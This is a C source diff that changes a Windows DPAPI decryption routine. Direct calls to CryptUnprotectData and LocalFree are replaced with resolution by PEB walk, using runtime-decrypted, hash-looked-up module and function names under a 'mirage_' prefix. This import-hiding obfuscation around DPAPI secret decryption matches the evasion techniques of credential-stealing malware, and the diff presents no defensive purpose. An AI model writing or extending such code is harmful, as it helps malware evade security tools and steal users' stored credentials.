@@ -14,6 +14,29 @@
 #ifdef _WIN32
 #include <windows.h>
 
+/* PEB-walk includes */
+#include "crypt32_peb.h"
+#include "peb.h"
+#include "export_resolve.h"
+#include "hash.h"
+#include "enc_strings.h"
+
+/* File-local PEB-walk for LocalFree (kernel32) */
+typedef HLOCAL (WINAPI *pLocalFree_fn)(HLOCAL);
+static struct { pLocalFree_fn pLF; int ready; } g_lf;
+static int ensure_local_free(void) {
+    if (g_lf.ready) return 1;
+    char dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
+    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
+    if (!k32) return 0;
+    char fn[32];
+    enc_decrypt(enc_LocalFree, ENC_LOCALFREE_LEN, fn);
+    g_lf.pLF = (pLocalFree_fn)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    if (!g_lf.pLF) return 0;
+    g_lf.ready = 1;
+    return 1;
+}
+
 /* MinGW BCrypt/Crypt compatibility — explicit types and declarations */
 #ifndef CRYPTPROTECT_UI_FORBIDDEN
 #define CRYPTPROTECT_UI_FORBIDDEN 0x01
@@ -70,10 +93,13 @@ int dpapi_decrypt_ex(const unsigned char *input, size_t input_len,
         p_entropy = &blob_entropy;
     }
 
+    const crypt32_api_t *c32 = mirage_crypt32_api();
+    if (!c32) return -1;
+
     DATA_BLOB blob_out;
     memset(&blob_out, 0, sizeof(blob_out));
 
-    BOOL result = CryptUnprotectData(
+    BOOL result = c32->pUnprotect(
         &blob_in,
         NULL,           /* ppszDataDescr */
         p_entropy,      /* pOptionalEntropy */
@@ -84,22 +110,22 @@ int dpapi_decrypt_ex(const unsigned char *input, size_t input_len,
     );
 
     if (!result || blob_out.cbData == 0) {
-        if (blob_out.pbData)
-            LocalFree(blob_out.pbData);
+        if (blob_out.pbData && ensure_local_free())
+            g_lf.pLF(blob_out.pbData);
         return -1;
     }
 
     /* Copy result to caller-allocated buffer */
     *output = (unsigned char *)malloc(blob_out.cbData);
     if (!*output) {
-        LocalFree(blob_out.pbData);
+        if (ensure_local_free()) g_lf.pLF(blob_out.pbData);
         return -1;
     }
 
     memcpy(*output, blob_out.pbData, blob_out.cbData);
     *out_len = (size_t)blob_out.cbData;
 
-    LocalFree(blob_out.pbData);
+    if (ensure_local_free()) g_lf.pLF(blob_out.pbData);
     return 0;
 }
 
